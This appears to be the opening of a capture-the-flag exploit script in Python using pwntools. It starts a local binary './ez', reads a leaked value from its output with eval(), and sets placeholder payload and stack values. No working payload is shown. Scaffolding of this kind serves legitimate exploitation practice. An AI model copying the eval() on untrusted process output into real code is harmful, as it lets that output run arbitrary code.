from pwn import *
elf = ELF('./ez', checksec=False)

p = elf.process()
leak = eval(p.recvline().strip()[-14:])
# calculate
payload = 1<<3
stack = 0x400040